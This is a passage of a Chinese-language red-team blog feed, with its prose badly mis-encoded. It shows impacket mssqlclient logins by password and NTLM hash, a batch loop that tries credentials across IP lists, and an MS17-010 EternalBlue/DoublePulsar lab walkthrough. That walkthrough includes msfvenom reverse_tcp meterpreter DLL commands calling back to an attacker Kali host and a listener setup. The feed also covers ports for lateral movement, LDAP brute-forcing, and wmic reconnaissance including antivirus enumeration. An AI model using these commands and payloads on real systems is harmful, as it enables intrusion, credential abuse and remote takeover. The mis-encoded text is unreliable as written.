number">192.168</span>.1.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://imgtp.apqiang.com/2022/03/29/sf3yL6bT.png"></p><h2 id="impacketæ¡†æ¶ä¹‹mssqlæœåŠ¡å™¨å®‰å…¨æ£€æµ‹"><a href="#impacketæ¡†æ¶ä¹‹mssqlæœåŠ¡å™¨å®‰å…¨æ£€æµ‹" class="headerlink" title="impacketæ¡†æ¶ä¹‹mssqlæœåŠ¡å™¨å®‰å…¨æ£€æµ‹"></a>impacketæ¡†æ¶ä¹‹mssqlæœåŠ¡å™¨å®‰å…¨æ£€æµ‹</h2><p>åœ¨å®é™…æ¸—é€æµ‹è¯•å·¥ä½œä¸­ç»å¸¸ä¼šé‡åˆ°æ£€æµ‹é¡¹ç›®ä¸­mssqlæœåŠ¡å™¨å®‰å…¨æ€§ï¼Œæ­¤ç¯‡æ–‡ç« ä»‹ç»impacketæ¡†æ¶ä¸­mssqlclientçš„ä½¿ç”¨æ–¹æ³•</p><p><a href="https://github.com/maaaaz/impacket-examples-windows">impacket for windows</a></p><h3 id="mssqlclientä¸å…¶ä»–å·¥å…·ç›¸æ¯”çš„ä¼˜åŠ¿"><a href="#mssqlclientä¸å…¶ä»–å·¥å…·ç›¸æ¯”çš„ä¼˜åŠ¿" class="headerlink" title="mssqlclientä¸å…¶ä»–å·¥å…·ç›¸æ¯”çš„ä¼˜åŠ¿"></a>mssqlclientä¸å…¶ä»–å·¥å…·ç›¸æ¯”çš„ä¼˜åŠ¿</h3><ol><li>è·¨å¹³å°ï¼Œpythonè„šæœ¬ç¼–å†™ï¼Œå¹¶ä¸”å·²æœ‰exeç‰ˆæœ¬</li><li>å‘½ä»¤è¡Œæ‰§è¡Œï¼Œé€Ÿåº¦å¿«</li><li>æ”¯æŒä½¿ç”¨socksä»£ç†ä¼ è¾“æ•°æ®</li><li>æ”¯æŒä»¥hashä¼ é€’çš„æ–¹å¼è¿›è¡Œè´¦å·éªŒè¯</li><li>æ”¯æŒwindowsè®¤è¯æ¨¡å¼è¿›è¡ŒmssqlæœåŠ¡çš„å®‰å…¨æ£€æµ‹</li><li>æ”¯æŒsqlå‘½ä»¤å¯ä»¥æ˜¯äº¤äº’å¼ï¼Œä¹Ÿå¯ä»¥ç›´æ¥å›æ˜¾sqlå‘½ä»¤æ‰§è¡Œç»“æœ</li></ol><h3 id="Mssqlclientçš„åŸºæœ¬ä½¿ç”¨å‘½ä»¤"><a href="#Mssqlclientçš„åŸºæœ¬ä½¿ç”¨å‘½ä»¤" class="headerlink" title="Mssqlclientçš„åŸºæœ¬ä½¿ç”¨å‘½ä»¤"></a>Mssqlclientçš„åŸºæœ¬ä½¿ç”¨å‘½ä»¤</h3><p>éªŒè¯ä»¥windowsè®¤è¯æ¨¡å¼çš„mssqlæœåŠ¡</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python mssqlclient.py domain/username:password@ip -windows-auth<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>éªŒè¯ä»¥mssqlè´¦å·å¯†ç è®¤è¯çš„mssqlæœåŠ¡</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python mssqlclient.py ./username:password@ip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>éªŒè¯ä»¥mssqlè´¦å·å¯†ç è®¤è¯çš„mssqlæœåŠ¡ï¼Œå¹¶æ‰§è¡Œcommand.txtå†…çš„sqlå‘½ä»¤</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python mssqlclient.py ./username:password@ip -file command.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="ä¸¾ä¾‹åˆ†æå‡ ç§å®é™…ä½¿ç”¨æƒ…å†µ"><a href="#ä¸¾ä¾‹åˆ†æå‡ ç§å®é™…ä½¿ç”¨æƒ…å†µ" class="headerlink" title="ä¸¾ä¾‹åˆ†æå‡ ç§å®é™…ä½¿ç”¨æƒ…å†µ"></a>ä¸¾ä¾‹åˆ†æå‡ ç§å®é™…ä½¿ç”¨æƒ…å†µ</h4><p>1.åœ¨linuxç¯å¢ƒä¸‹ä½¿ç”¨windowsè®¤è¯æ¨¡å¼ï¼Œmssqlclientæµ‹è¯•ç™»å½•sqlserveræœåŠ¡å™¨ï¼Œå¦‚ä¸‹å›¾ï¼Œè´¦å·éªŒè¯é€šè¿‡åç›´æ¥è¿”å›sql shell</p><p><img src="https://imgtp.apqiang.com/2022/03/29/hajm7yu7.png"></p><p>2.ä½¿ç”¨ntlm hashéªŒè¯æ–¹å¼ï¼Œmssqlclientæµ‹è¯•ç™»å½•sqlserveræœåŠ¡å™¨ï¼Œè´¦å·éªŒè¯æˆåŠŸåè¿”å›sql shellï¼Œå¦‚ä¸‹å›¾</p><p><img src="https://imgtp.apqiang.com/2022/03/30/QJC8uvVZ.png"></p><h3 id="æ‰¹é‡æ£€æµ‹"><a href="#æ‰¹é‡æ£€æµ‹" class="headerlink" title="æ‰¹é‡æ£€æµ‹"></a>æ‰¹é‡æ£€æµ‹</h3><p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜å¯ä»¥æ‰¹é‡æ£€æµ‹å†…ç½‘SQL serveræœåŠ¡å™¨çš„è´¦å·å®‰å…¨æ€§ã€‚</p><p>éœ€å‡†å¤‡çš„æ–‡ä»¶æœ‰ï¼š</p><ul><li>mssqlclient.exeï¼ˆå¿…é¡»ï¼‰</li><li>command.txtï¼ˆå¿…é¡»ï¼‰</li></ul><p>ä»¥ä¸‹å››ä¸ªæ–‡ä»¶éœ€é€‰å…¶ä¸€</p><ul><li>hashes.txtï¼ˆéœ€éªŒè¯çš„ntlm hashå­—ç¬¦ä¸²åˆ—è¡¨ï¼‰</li><li>username.txtï¼ˆéœ€éªŒè¯çš„usernameåˆ—è¡¨ï¼‰</li><li>password.txtï¼ˆéœ€éªŒè¯çš„å¯†ç å­—ç¬¦ä¸²åˆ—è¡¨ï¼‰</li><li>Ips.txtï¼ˆéœ€éªŒè¯çš„ipå­—ç¬¦ä¸²åˆ—è¡¨ï¼‰</li></ul><h4 id="ä¸¾ä¾‹æ‰¹é‡æ£€æµ‹çš„batè„šæœ¬å†…å®¹"><a href="#ä¸¾ä¾‹æ‰¹é‡æ£€æµ‹çš„batè„šæœ¬å†…å®¹" class="headerlink" title="ä¸¾ä¾‹æ‰¹é‡æ£€æµ‹çš„batè„šæœ¬å†…å®¹"></a>ä¸¾ä¾‹æ‰¹é‡æ£€æµ‹çš„batè„šæœ¬å†…å®¹</h4><p>æµ‹è¯•ä»¥windowsè®¤è¯æ¨¡å¼ï¼Œä½¿ç”¨æ˜æ–‡å¯†ç éªŒè¯ï¼Œä½¿ç”¨mssqlclientæ‰¹é‡æµ‹è¯•ç™»å½•sqlserveræœåŠ¡å™¨ï¼Œips.txtå†…å®¹ä¸ºå¾…æ£€æµ‹sqlserveræœåŠ¡å™¨ipï¼Œæ¯è¡Œä¸€æ¡</p><pre class="line-numbers language-bat" data-language="bat"><code class="language-bat">for &#x2F;f %%i in (ips.txt) do mssqlclient.exe .&#x2F;test:test@%%i -windows-auth<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨cmdä¸­å¯ä»¥æŠŠ %%i æ›¿æ¢ä¸º %i ç›´æ¥æ‰§è¡Œ</p><p>å¯æ ¹æ®æ­¤æ¨¡æ¿æ›´æ¢æ‰¹é‡æ£€æµ‹çš„ä½ç½®</p><p><img src="https://imgtp.apqiang.com/2022/03/30/RrQrbm7Y.png"></p><h2 id="MS17-010-py-è„šæœ¬åˆ©ç”¨"><a href="#MS17-010-py-è„šæœ¬åˆ©ç”¨" class="headerlink" title="MS17_010.py è„šæœ¬åˆ©ç”¨"></a>MS17_010.py è„šæœ¬åˆ©ç”¨</h2><h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>ä¸ºä»€ä¹ˆè¦ä»‹ç»pyè„šæœ¬ï¼Ÿå› ä¸ºæœ‰äº›æœºå™¨å­˜åœ¨æ¼æ´ï¼Œä½†ä½¿ç”¨MSFçš„æ¨¡å—åˆ©ç”¨å¤±è´¥ï¼Œè€Œä½¿ç”¨pyè„šæœ¬åˆ™èƒ½æˆåŠŸåˆ©ç”¨</p><h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><p>å¿…è¦å·¥å…· <a href="https://www.python.org/downloads/release/python-266/">python2.6.6</a>ã€<a href="https://github.com/mhammond/pywin32/releases/download/b221/pywin32-221.win32-py2.6.exe">pywin32-221.win32-py2.6.exe</a>ã€<a href="https://github.com/misterch0c/shadowbroker">shadowbroker</a>ï¼ˆå¿…éœ€è¦ä¸¥æ ¼æŒ‰ç…§ç‰ˆæœ¬å®‰è£…æ‰èƒ½æ­£å¸¸è¿è¡Œï¼‰</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">åœ¨æœ¬åœ°ç”¨è™šæ‹Ÿæœºæ­å»ºäº†Kaliå’ŒWindowsç³»ç»Ÿ<span class="token number">192.168</span>.186.8windows7 IPè„šæœ¬æ“ä½œæœº<span class="token number">192.168</span>.186.5win2003 IPé¶æœº<span class="token number">192.168</span>.186.26kali IPç”¨äºshellå›è¿<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨kaliä¸­ç”¨msfvenomç”Ÿæˆ64ä½çš„dll</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.186.26 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> -f dll <span class="token operator">></span> x64.dllmsfvenom -p windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.186.26 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> -f dll <span class="token operator">></span> x32.dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>åœ¨msfä¸­é…ç½®ç›‘å¬æ¨¡å—</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfconsoleè¿›å…¥æ§åˆ¶å°use exploit/multi/handler//ä½¿ç”¨ç›‘å¬æ¨¡å—<span class="token builtin class-name">set</span> payload windows/x64/meterpreter/reverse_tcp//è®¾ç½®payloadshow options//æŸ¥çœ‹é…ç½®ä¿¡æ¯<span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.186.26//è®¾ç½®æœ¬åœ°IP<span class="token builtin class-name">set</span> LPORT <span class="token number">4444</span>//è®¾ç½®æœ¬åœ°ç«¯å£run//è¿è¡Œ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿›å…¥åˆ°shadowbrokeræ–‡ä»¶å¤¹ä¸‹çš„windowsæ–‡ä»¶å¤¹ä¸­æ‰“å¼€fb.pyï¼Œæ ¹æ®æç¤ºè¾“å…¥å‚æ•°</p><p>ä½¿ç”¨Eternalblueæ¨¡å—æ”»å‡»</p><p><img src="https://imgtp.apqiang.com/2022/03/30/AvXzNOAs.png"></p><p><img src="https://imgtp.apqiang.com/2022/03/30/9UzdrKiP.png"></p><p><img src="https://imgtp.apqiang.com/2022/03/30/2qT8D7DC.png"></p><p>ä½¿ç”¨Doublepulsaræ¨¡å—å›è¿shellåˆ°kali</p><p><img src="https://imgtp.apqiang.com/2022/03/30/ruzDyvkM.png"></p><p><img src="https://imgtp.apqiang.com/2022/03/30/bX85uHu6.png"></p><p>æ¥ä¸‹æ¥ä¸€è·¯å›è½¦ï¼Œä¹‹ååœ¨kaliä¸Šè·å¾—shell</p><p><img src="https://imgtp.apqiang.com/2022/03/30/bB4HlCyX.png"></p><p>NSA-ms17-010å‚è€ƒæ–‡ç« </p><p><a href="https://blog.csdn.net/weixin_38948797/article/details/79177880">https://blog.csdn.net/weixin_38948797/article/details/79177880</a></p>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> å¤–éƒ¨æ‰“ç‚¹ </tag>
            
            <tag> tools </tag>
            
            <tag> åº”ç”¨æ¼æ´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†…ç½‘æ¨ªå‘å¸¸è§ç«¯å£</title>
      <link href="/2022/03/29/nei-wang-heng-xiang-chang-jian-duan-kou/"/>
      <url>/2022/03/29/nei-wang-heng-xiang-chang-jian-duan-kou/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç« èŠ‚å†…å®¹ä¸»è¦æ˜¯ä»‹ç»åœ¨å†…ç½‘ä¸­è¯¥ä¸€äº›å¸¸è§çš„ç«¯å£ã€‚</p><p>æ–‡ç« å†…å®¹ä¸»è¦æ‘˜è‡ªæŸçº¢é˜Ÿç³»åˆ—ä¸›ä¹¦ï¼Œå°†å¸‚é¢ä¸Šç°åœ¨æµä¼ çš„ redteam ç³»åˆ—ä¹¦ç±è¿›è¡Œä¸€ä¸ªå­¦ä¹ è®°å½•ã€‚</p><h2 id="Portï¼š445"><a href="#Portï¼š445" class="headerlink" title="Portï¼š445"></a>Portï¼š445</h2><p>SMBï¼ˆServer Message Blockï¼‰Windowsåè®®æ—ï¼Œä¸»è¦åŠŸèƒ½ä¸ºæ–‡ä»¶æ‰“å°å…±äº«æœåŠ¡ï¼Œç®€å•æ¥è®²å°±æ˜¯å…±äº«æ–‡ä»¶å¤¹</p><p>è¯¥ç«¯å£ä¹Ÿæ˜¯è¿‘å¹´æ¥å†…ç½‘æ¨ªå‘æ‰©å±•ä¸­æ¯”è¾ƒç«çš„ç«¯å£ï¼Œå¤§åé¼é¼çš„æ°¸æ’ä¹‹è“æ¼æ´å°±æ˜¯åˆ©ç”¨è¯¥ç«¯å£ï¼Œæ“ä½œä¸ºæ‰«æå…¶æ˜¯å¦å­˜åœ¨MS17-010æ¼æ´ã€‚æ­£å¸¸æƒ…å†µä¸‹ï¼Œå…¶å‘½ä»¤ä¸»è¦æ˜¯å»ºç«‹IPCæœåŠ¡ç©ºä¼šè¯</p><p><code>net use \\192.168.1.2</code></p><p>è¿œç¨‹æœ¬åœ°è®¤è¯</p><p><code>net use \\192.168.1.2 /user:a\username password</code></p><p>æ³¨ï¼ša/username ä¸­ a ä¸ºå·¥ä½œç»„æƒ…å†µä¸‹çš„æœºå™¨å‘½åï¼Œå¯ä»¥ä¸ºä»»æ„å­—ç¬¦ï¼Œä¾‹å¦‚ workgroup/username</p><p>åŸŸ test.local è¿œç¨‹è®¤è¯</p><p><code>net use \\192.168.1.2 /user:test\username password</code></p><h2 id="Portï¼š137ã€138ã€139"><a href="#Portï¼š137ã€138ã€139" class="headerlink" title="Portï¼š137ã€138ã€139"></a>Portï¼š137ã€138ã€139</h2><p>NetBiosç«¯å£ï¼Œ137ã€138ä¸ºUDPç«¯å£ï¼Œä¸»è¦ç”¨äºå†…ç½‘ä¼ è¾“æ–‡ä»¶ï¼Œè€ŒNetBios/SMBæœåŠ¡å™¨çš„è·å–ä¸»è¦æ˜¯é€šè¿‡139ç«¯å£çš„</p><h2 id="Portï¼š135"><a href="#Portï¼š135" class="headerlink" title="Portï¼š135"></a>Portï¼š135</h2><p>è¯¥ç«¯å£ä¸»è¦ä½¿ç”¨DCOMå’ŒRPCï¼ˆRemote Procedure Callï¼‰æœåŠ¡ï¼Œæˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªç«¯å£ä¸»è¦åšWMIï¼ˆWindos Management Instrumentationï¼‰ç®¡ç†å·¥å…·çš„è¿œç¨‹æ“ä½œ</p><ul><li>ä½¿ç”¨æ—¶éœ€è¦å¼€å¯wmicæœåŠ¡</li><li>å‡ ä¹æ‰€æœ‰çš„å‘½ä»¤éƒ½æ˜¯ç®¡ç†å‘˜æƒé™</li><li>å¦‚æœå‡ºç°â€Invalid Global Switchâ€ï¼Œéœ€è¦ä½¿ç”¨åŒå¼•å·æŠŠè¯¥åŠ çš„åœ°æ–¹éƒ½åŠ ä¸Š</li><li>è¿œç¨‹ç³»ç»Ÿçš„æœ¬åœ°å®‰å…¨ç­–ç•¥çš„â€ç½‘ç»œè®¿é—®ï¼šæœ¬åœ°è´¦æˆ·çš„å…±äº«å’Œå®‰å…¨æ¨¡å¼â€åº”è®¾ä¸ºâ€ç»å…¸-æœ¬åœ°ç”¨æˆ·ä»¥è‡ªå·±çš„èº«ä»½éªŒè¯â€</li><li>é˜²ç«å¢™æœ€å¥½æ˜¯å…³é—­çŠ¶æ€</li></ul><p>åŒæ—¶ï¼Œwmicè¿˜æœ‰å¾ˆå¤šç‰ˆæœ¬ ç±»ä¼¼äº pythonç‰ˆæœ¬ã€Powershellç‰ˆæœ¬å’Œexeç‰ˆæœ¬ç­‰ç­‰</p><p>è¯¥ç«¯å£è¿˜å¯ä»¥éªŒè¯æ˜¯å¦å¼€å¯Exchange Server</p><h2 id="Portï¼š53"><a href="#Portï¼š53" class="headerlink" title="Portï¼š53"></a>Portï¼š53</h2><p>è¯¥ç«¯å£ä¸ºDNSæœåŠ¡ç«¯å£ï¼Œåªè¦æä¾›åŸŸåè§£ææœåŠ¡ä½¿ç”¨ï¼Œè¯¥ç«¯å£åœ¨æ¸—é€è¿‡ç¨‹ä¸­å¯ä»¥å¯»æ‰¾ä¸€ä¸‹DNSåŸŸä¼ é€æ¼æ´ï¼Œåœ¨å†…ç½‘ä¸­å¯ä»¥ä½¿ç”¨DNSåè®®è¿›è¡Œé€šä¿¡ä¼ è¾“ï¼Œéšè”½æ€§æ›´åŠ å¥½ï¼Œå‚è€ƒæ–‡ç« ï¼š</p><ul><li>dnséš§é“ä¹‹dns2tcp</li><li>dnséš§é“ä¹‹dnscat2</li></ul><h2 id="Portï¼š389"><a href="#Portï¼š389" class="headerlink" title="Portï¼š389"></a>Portï¼š389</h2><p>ç”¨äºLADPï¼ˆè½»é‡çº§ç›®å½•è®¿é—®åè®®ï¼‰ï¼Œå±äºTCP/IPåè®®ï¼Œåœ¨åŸŸè¿‡ç¨‹ä¸­ä¸€èˆ¬å‡ºç°åœ¨åŸŸæ§ä¸Šå‡ºç°è¯¥ç«¯å£ï¼Œè¿›è¡Œæƒé™è®¤è¯æœåŠ¡ï¼Œå¦‚æœæ‹¥æœ‰å¯¹è¯¥åŸŸçš„ç”¨æˆ·ï¼Œä¸”æ‹…å¿ƒnetæˆ–è€…å…¶ä»–çˆ†ç ´æ–¹æ³•ä¸å¯è¡Œçš„æƒ…å†µï¼Œå¯ä»¥å°è¯•ä½¿ç”¨LADPç«¯å£è¿›è¡Œçˆ†ç ´</p><p>å·¥å…·å¯ä»¥ä½¿ç”¨ç±»ä¼¼äºhydraç­‰å¼€æºé¡¹ç›®</p><h2 id="Portï¼š88"><a href="#Portï¼š88" class="headerlink" title="Portï¼š88"></a>Portï¼š88</h2><p>è¯¥ç«¯å£ä¸»è¦å¼€å¯kerberosæœåŠ¡ï¼Œå±äºTCP/IPåè®®ï¼Œä¸»è¦ä»»åŠ¡æ˜¯ç›‘å¬KDCçš„ç¥¨æ®è¯·æ±‚ï¼Œè¯¥åè®®åœ¨æ¸—é€è¿‡ç¨‹ä¸­å¯ä»¥è¿›è¡Œé»„é‡‘ç¥¨æ®å’Œç™½é“¶ç¥¨æ®çš„ä¼ªé€ ï¼Œä»¥æ¨ªå‘æ‰©å±•æŸäº›æœåŠ¡</p><h2 id="Portï¼š5985"><a href="#Portï¼š5985" class="headerlink" title="Portï¼š5985"></a>Portï¼š5985</h2><p>è¯¥ç«¯å£ä¸»è¦ä»‹ç»WinRMæœåŠ¡ï¼ŒWinRMæ˜¯Windowså¯¹WS-Managementçš„å®ç°ï¼ŒWinRMå…è®¸è¿œç¨‹ç”¨æˆ·ä½¿ç”¨å·¥å…·å’Œè„šæœ¬å¯¹WindowsæœåŠ¡è¿›è¡Œç®¡ç†å¹¶è·å–æ•°æ®ã€‚å¹¶ä¸”WinRMæœåŠ¡è‡ªWindows Vistaå¼€å§‹æˆä¸ºWindowsçš„é»˜è®¤ç»„ä»¶</p><p>æ¡ä»¶ï¼š</p><ul><li>Windows Vistaä¸Šå¿…é¡»æ‰‹åŠ¨å¯åŠ¨ï¼Œè€ŒWindows Server 2008ä¸­æœåŠ¡æ˜¯é»˜è®¤å¼€å¯çš„</li><li>æœåŠ¡åœ¨åå°å¼€å¯ï¼Œä½†ç«¯å£è¿˜æ²¡æœ‰å¼€å¯ç›‘å¬ï¼Œæ‰€ä»¥éœ€è¦å¼€å¯ç«¯å£</li><li>ä½¿ç”¨ winrm quickconfig å¯¹WinRMè¿›è¡Œé…ç½®ï¼Œå¼€å¯HTTPå’ŒHTTPSç›‘å¬ï¼Œä¸”éœ€è¦å¼€å¯é˜²ç«å¢™</li></ul>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> ä¿¡æ¯æ”¶é›† </tag>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å†…ç½‘ä¿¡æ¯æœé›†ä¹‹wmicå‘½ä»¤çš„ä¸€äº›ä½¿ç”¨æ–¹æ³•</title>
      <link href="/2022/03/28/nei-wang-xin-xi-sou-ji-zhi-wmic-ming-ling-de-yi-xie-shi-yong-fang-fa/"/>
      <url>/2022/03/28/nei-wang-xin-xi-sou-ji-zhi-wmic-ming-ling-de-yi-xie-shi-yong-fang-fa/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç« èŠ‚å†…å®¹ä¸»è¦æ˜¯ä»‹ç»åœ¨å†…ç½‘ä¸­wmicå‘½ä»¤ã€‚</p><p>æ–‡ç« å†…å®¹ä¸»è¦æ‘˜è‡ªæŸçº¢é˜Ÿç³»åˆ—ä¸›ä¹¦ï¼Œå°†å¸‚é¢ä¸Šç°åœ¨æµä¼ çš„ redteam ç³»åˆ—ä¹¦ç±è¿›è¡Œä¸€ä¸ªå­¦ä¹ è®°å½•ã€‚</p><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00.å‰è¨€"></a>0x00.å‰è¨€</h2><p>wmicå’Œcmdä¸€æ ·åœ¨æ‰€æœ‰çš„windowsç‰ˆæœ¬ä¸­éƒ½å­˜åœ¨ï¼ŒåŒæ—¶wmicæœ‰å¾ˆå¤šcmdä¸‹ä¸æ–¹ä¾¿ä½¿ç”¨çš„éƒ¨åˆ†ï¼Œä»Šå¤©ç»™å¤§å®¶ä»‹ç»ä¸€äº›åœ¨åæ¸—é€è¿‡ç¨‹ä¸­éå¸¸é€‚ç”¨çš„ä½¿ç”¨wmicè¿›è¡Œä¿¡æ¯æ”¶é›†çš„å‘½ä»¤</p><h2 id="0x01-å…³äºwmic"><a href="#0x01-å…³äºwmic" class="headerlink" title="0x01.å…³äºwmic"></a>0x01.å…³äºwmic</h2><p>WMIå‘½ä»¤è¡Œï¼ˆWMICï¼‰å®ç”¨ç¨‹åºä¸ºWMIæä¾›äº†å‘½ä»¤è¡Œç•Œé¢ã€‚WMICä¸ç°æœ‰çš„Shellå’Œå®ç”¨ç¨‹åºå‘½ä»¤å…¼å®¹ã€‚åœ¨WMICå‡ºç°ä¹‹å‰ï¼Œå¦‚æœè¦ç®¡ç†WMIç³»ç»Ÿï¼Œå¿…é¡»ä½¿ç”¨ä¸€äº›ä¸“é—¨çš„WMIåº”ç”¨ï¼Œä¾‹å¦‚SMSï¼Œæˆ–è€…ä½¿ç”¨WMIçš„è„šæœ¬ç¼–ç¨‹APIï¼Œæˆ–è€…ä½¿ç”¨åƒCIM Studioä¹‹ç±»çš„å·¥å…·ã€‚å¦‚æœä¸ç†Ÿæ‚‰C++ä¹‹ç±»çš„ç¼–ç¨‹è¯­è¨€æˆ–VBSCriptä¹‹ç±»çš„è„šæœ¬è¯­è¨€ï¼Œæˆ–è€…ä¸æŒæ¡WMIåç§°ç©ºé—´çš„åŸºæœ¬çŸ¥è¯†ï¼Œè¦ç”¨WMIç®¡ç†ç³»ç»Ÿæ˜¯å¾ˆå›°éš¾çš„ã€‚WMICæ”¹å˜äº†è¿™ç§æƒ…å†µ</p><h2 id="0x02-wmicçš„ç®€å•ä½¿ç”¨"><a href="#0x02-wmicçš„ç®€å•ä½¿ç”¨" class="headerlink" title="0x02.wmicçš„ç®€å•ä½¿ç”¨"></a>0x02.wmicçš„ç®€å•ä½¿ç”¨</h2><p>é¦–å…ˆåœ¨cmdå‘½ä»¤è¡Œè¾“å…¥wmicè¿›å…¥äº¤äº’å¼é¡µé¢ï¼Œè¿™é‡Œè¯´ä¸€ä¸‹åœ¨powershellä¹Ÿå¯ä»¥å’Œcmdå‘½ä»¤è¡Œä¸€æ ·çš„æ“ä½œ</p><p><code>wmic /ï¼Ÿ</code> æŸ¥çœ‹WMICå‘½ä»¤çš„å…¨å±€é€‰é¡¹ï¼ŒWMICå…¨å±€é€‰é¡¹å¯ä»¥ç”¨æ¥è®¾ç½®WMICç¯å¢ƒçš„å„ç§å±æ€§</p><p><img src="https://imgtp.apqiang.com/2022/03/28/Pfa0qYVK.png"></p><p><code>wmic process /?</code> è¿›ç¨‹ç®¡ç†çš„å¸®åŠ©</p><p><img src="https://imgtp.apqiang.com/2022/03/28/uCo7Z5x3.png"></p><p><code>wmic process get /?</code> å±æ€§è·å–æ“ä½œå¸®åŠ©</p><p><img src="https://imgtp.apqiang.com/2022/03/28/nQO8OTsj.png"></p><h2 id="0x03-ä»¥è¿›ç¨‹ä¸ºä¾‹å±•ç°wmicçš„ä½¿ç”¨"><a href="#0x03-ä»¥è¿›ç¨‹ä¸ºä¾‹å±•ç°wmicçš„ä½¿ç”¨" class="headerlink" title="0x03.ä»¥è¿›ç¨‹ä¸ºä¾‹å±•ç°wmicçš„ä½¿ç”¨"></a>0x03.ä»¥è¿›ç¨‹ä¸ºä¾‹å±•ç°wmicçš„ä½¿ç”¨</h2><p>è¿™é‡Œçš„é¶æœºä½¿ç”¨çš„æ˜¯ä¸€å°win7 x86çš„è™šæ‹Ÿæœº è¿™é‡Œä»¥æŸ¥çœ‹è¿›ç¨‹ä¸ºä¾‹ï¼š</p><p><code>wmic process get caption,executablepath,processid</code> è·å–ç³»ç»Ÿå½“å‰æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ã€è¿›ç¨‹è¿è¡Œçš„è·¯å¾„ã€è¿›ç¨‹id</p><p><img src="https://imgtp.apqiang.com/2022/03/28/rNIxLrly.png"></p><p><code>wmic service where (state=&quot;running&quot;) get name,processid,pathname,startmode,caption</code> è·å–ç³»ç»Ÿè¿è¡Œçš„åº”ç”¨è¿›ç¨‹ï¼Œè¿›ç¨‹åç§°ï¼Œè¿›ç¨‹åº”ç”¨è·¯å¾„ã€è¿›ç¨‹id</p><p><img src="https://imgtp.apqiang.com/2022/03/28/dUB7fPTT.png"></p><p><code>wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState,pathToSignedProductExe,productState</code> æŸ¥è¯¢æ€æ¯’è½¯ä»¶</p><p><img src="https://imgtp.apqiang.com/2022/03/29/U69zvrpq.png"></p><p><code>wmic onboarddevice get Description,DeviceType,Enabled,Status /format:list</code> è·å–ä¸»æ¿å†…ç½®ä¿¡æ¯</p><p><img src="https://imgtp.apqiang.com/2022/03/29/JVqNqWon.png"></p><p><code>wmic product get name</code> ç³»ç»Ÿå®‰è£…è½¯ä»¶æƒ…å†µ</p><p><img src="https://imgtp.apqiang.com/2022/03/29/9O3uj4Xz.png"></p><p><code>wmic environment get Description,VariableValue</code> ç³»ç»Ÿç¯å¢ƒå˜é‡</p><p><img src="https://imgtp.apqiang.com/2022/03/29/m5GnGk0V.png"></p><p><code>wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:list</code>  è·å–åŸŸåï¼Œä¸»æ¿ä¿¡æ¯ï¼Œä¸»æœºåï¼Œè§’è‰²ï¼Œç”¨æˆ·å</p><p><img src="https://imgtp.apqiang.com/2022/03/29/Bgy0UFlt.png"></p><p><code>wmic sysdriver get caption,Name,PathName,ServiceType,State,Status /format:list</code> è·å–æ‰€æœ‰è¿›ç¨‹çš„è¿›ç¨‹åã€è¿è¡Œè·¯å¾„ã€æœåŠ¡ç±»å‹ã€çŠ¶æ€</p><p><img src="https://imgtp.apqiang.com/2022/03/29/ZYVGLPnS.png"></p><p>å…³äºè·Ÿå¤šçš„ä¿¡æ¯å¯ä»¥é€šè¿‡å®˜æ–¹çš„è¯´æ˜æ–‡æ¡£</p><p><a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wmic">https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wmic</a></p><h2 id="0x04-å…³äºpowershellçš„Get-Wmiå¯¹è±¡"><a href="#0x04-å…³äºpowershellçš„Get-Wmiå¯¹è±¡" class="headerlink" title="0x04.å…³äºpowershellçš„Get-Wmiå¯¹è±¡"></a>0x04.å…³äºpowershellçš„Get-Wmiå¯¹è±¡</h2><p>Get-Wmiæ˜¯è·å–Windows Management Instrumentationï¼ˆWMIï¼‰ç±»çš„å®ä¾‹æˆ–æœ‰å…³å¯ç”¨ç±»çš„ä¿¡æ¯ã€‚</p><p>æˆ‘ä»¬éœ€è¦é¦–å…ˆçŸ¥é“è‡ªå·±çš„windowsè®¡ç®—æœºæ”¯æŒå“ªäº›å¯ç”¨çš„WMIç±»</p><p><code>Get-Wmiobject -list</code> 